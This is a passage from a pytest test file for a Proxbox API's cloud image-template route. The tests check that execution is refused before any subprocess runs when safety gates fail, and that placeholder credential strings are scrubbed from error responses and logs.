        "proxbox_api.routes.cloud.pipeline_scripts.asyncio.create_subprocess_exec",
        _fail_if_subprocess_runs,
    )

    status_code, payload, _text = await _post_json(
        "/cloud/templates/images",
        _execute_route_payload(),
        api_key="",
        include_auth=False,
    )

    assert status_code == 422
    assert payload["detail"] == "endpoint_id is required when execute=true."


@pytest.mark.asyncio
async def test_execute_route_enforces_allow_writes_before_subprocess(
    sync_route_session,
    monkeypatch,
):
    monkeypatch.setenv("PROXBOX_ENABLE_CLOUD_IMAGE_EXECUTION", "true")
    monkeypatch.setattr(
        "proxbox_api.routes.cloud.pipeline_scripts.asyncio.create_subprocess_exec",
        _fail_if_subprocess_runs,
    )
    endpoint = ProxmoxEndpoint(
        name="pve-write-disabled",
        ip_address="93.184.216.34",
        username="root@pam",
        allow_writes=False,
        access_methods="api_ssh",
    )
    sync_route_session.add(endpoint)
    sync_route_session.commit()
    sync_route_session.refresh(endpoint)

    status_code, payload, _text = await _post_json(
        "/cloud/templates/images",
        _execute_route_payload(endpoint_id=endpoint.id),
        api_key="",
        include_auth=False,
    )

    assert status_code == 403
    assert payload["reason"] == "endpoint_writes_disabled"
    assert payload["endpoint_id"] == endpoint.id


@pytest.mark.asyncio
async def test_execute_route_enforces_ssh_transport_gate_before_subprocess(
    sync_route_session,
    monkeypatch,
):
    monkeypatch.setenv("PROXBOX_ENABLE_CLOUD_IMAGE_EXECUTION", "true")
    monkeypatch.setattr(
        "proxbox_api.routes.cloud.pipeline_scripts.asyncio.create_subprocess_exec",
        _fail_if_subprocess_runs,
    )
    endpoint = ProxmoxEndpoint(
        name="pve-api-only",
        ip_address="93.184.216.34",
        username="root@pam",
        allow_writes=True,
        access_methods="api",
    )
    sync_route_session.add(endpoint)
    sync_route_session.commit()
    sync_route_session.refresh(endpoint)

    status_code, payload, _text = await _post_json(
        "/cloud/templates/images",
        _execute_route_payload(endpoint_id=endpoint.id),
        api_key="",
        include_auth=False,
    )

    assert status_code == 403
    assert payload["detail"]["reason"] == "ssh_not_enabled_for_endpoint"
    assert payload["detail"]["endpoint_id"] == endpoint.id


@pytest.mark.asyncio
async def test_execute_route_scrubs_unexpected_subprocess_failure(
    monkeypatch,
    proxbox_caplog: pytest.LogCaptureFixture,
    tmp_path: Path,
):
    canary = "https://root:password@pve.example/?token=PACKER-SUBPROCESS-SECRET"
    monkeypatch.setenv("PROXBOX_ENABLE_CLOUD_IMAGE_EXECUTION", "true")

    async def fail(*_args: object, **_kwargs: object) -> None:
        raise RuntimeError(canary)

    async def fake_pin(_target: object) -> Path:
        return tmp_path / "known_hosts"

    monkeypatch.setattr(pipeline_scripts.asyncio, "create_subprocess_exec", fail)
    monkeypatch.setattr(
        pipeline_scripts,
        "_pinned_known_hosts_file",
        fake_pin,
    )
    result = await pipeline_scripts._pipeline_execution_result(
        CloudImageTemplateBuildRequest(product_type="pfsense", execute=True),
        "true\n",
        execution_allowed=True,
        execution_target=CloudImageSSHExecutionTarget(
            host="93.184.216.34",
            user="root",
            port=22,
            identity_file="/etc/proxbox/ssh_keys/id_ed25519",
            known_host_fingerprint="SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        ),
        remote_unit="proxbox-cloud-image-00000000-0000-0000-0000-000000000001",
    )

    assert result[0] == "failed"
    assert result[3][0].code == "execution_unavailable"
    assert canary not in str(result)
    assert canary not in proxbox_caplog.text
    assert "error_type=RuntimeError" in proxbox_caplog.text


@pytest.mark.asyncio
async def test_direct_build_scrubs_sdk_failure_at_http_boundary(
    sync_route_session,
    monkeypatch,
    proxbox_caplog: pytest.LogCaptureFixture,
):
    canary = "https://root:password@pve.example/?sig=PACKER-DIRECT-SDK-SECRET"
    endpoint = ProxmoxEndpoint(
        name="pve-direct-sdk-error",
        ip_address="93.184.216.34",
        username="root@pam",
        allow_writes=True,
    )
    sync_route_session.add(endpoint)
    sync_route_session.commit()
    sync_route_session.refresh(endpoint)

    class FailingDownloadResource:
        async def post(self, **_kwargs: object) -> object:
            raise RuntimeError(canary)

    class DirectNode:
        def storage(self, _path: str) -> FailingDownloadResource:
            return FailingDownloadResource()

    class DirectAPI:
        def nodes(self, _node: str) -> DirectNode:
            return DirectNode()

    class DirectSession:
        session = DirectAPI()

        async def aclose(self) -> None:
            return None

    async def fake_open(_endpoint: ProxmoxEndpoint) -> DirectSession:
        return DirectSession()

    async def no_existing_vm(*_args: object, **_kwargs: object) -> None:
        return None

    async def image_missing(*_args: object, **_kwargs: object) -> bool:
        return False

    monkeypatch.setattr(template_images, "_open_proxmox_session", fake_open)
    monkeypatch.setattr(template_images, "_vm_config_or_none", no_existing_vm)
    monkeypatch.setattr(template_images, "_image_exists", image_missing)

    status_code, payload, text = await _post_json(
        "/cloud/templates/images",
        {
            "endpoint_id": endpoint.id,
            "target_node": "pve01",
            "vmid": 9010,
            "name": "direct-sdk-error",
            "image_url": PUBLIC_IMAGE_URL,
            "product_type": "firecracker",
        },
        api_key="",
        include_auth=False,
    )

    assert status_code == 502
    assert payload["detail"] == {
        "code": "proxmox_build_failed",
        "endpoint_id": endpoint.id,
        "message": "The Proxmox image-template build failed.",
    }
    assert canary not in text
    assert canary not in proxbox_caplog.text
    assert "error_type=RuntimeError" in proxbox_caplog.text


@pytest.mark.asyncio
async def test_direct_build_cleanup_failure_does_not_mask_http_response(
    sync_route_session,
    monkeypatch,
    proxbox_caplog: pytest.LogCaptureFixture,
):
    canary = "https://root:password@pve.example/?sig=PACKER-DIRECT-CLOSE-SECRET"
    endpoint = ProxmoxEndpoint(
        name="pve-direct-close-error",
        ip_address="93.184.216.34",
        username="root@pam",
        allow_writes=True,
    )
    sync_route_session.add(endpoint)
    sync_route_session.commit()
    sync_route_session.refresh(endpoint)

    class FailingCloseSession:
        async def aclose(self) -> None:
            raise RuntimeError(canary)

    async def fake_open(_endpoint: ProxmoxEndpoint) -> FailingCloseSession:
        return FailingCloseSession()

    async def ready_template(*_args: object, **_kwargs: object) -> dict[str, object]:
        return {
            "template": 1,
            "name": "already-ready",
            "scsi0": "local-zfs:vm-9010-disk-0",
            "ide2": "local-zfs:cloudinit",
            "boot": "order=scsi0",
        }

    monkeypatch.setattr(template_images, "_open_proxmox_session", fake_open)
    monkeypatch.setattr(template_images, "_vm_config_or_none", ready_template)

    status_code, payload, text = await _post_json(
        "/cloud/templates/images",
        {
            "endpoint_id": endpoint.id,
            "target_node": "pve01",
            "vmid": 9010,
            "name": "direct-close-error",
            "image_url": PUBLIC_IMAGE_URL,
            "product_type": "firecracker",
        },
        api_key="",
        include_auth=False,
    )

    assert status_code == 201
    assert payload["status"] == "already_exists"
    assert canary not in text
    assert canary not in proxbox_caplog.text
    assert "error_type=RuntimeError" in proxbox_caplog.text
